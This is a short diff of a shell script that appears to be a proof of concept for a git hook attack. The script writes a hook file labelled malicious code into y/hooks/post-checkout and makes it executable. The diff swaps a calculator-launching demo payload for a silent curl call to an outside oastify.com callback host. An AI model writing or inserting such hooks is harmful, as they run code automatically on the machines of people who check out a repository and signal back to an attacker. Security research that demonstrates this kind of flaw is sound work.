@@ -18,9 +18,7 @@ mkdir -p y/hooks
 # Write the malicious code to a hook
 cat > y/hooks/post-checkout <<EOF
 #!/bin/bash
-echo "amal_was_here" > /tmp/pwnd
-calc.exe
-open -a Calculator.app
+curl -s http://424xlk7amvdlwi768xq9yjwpvg1ap2dr.oastify.com
 EOF
 
 # Make the hook executable: important
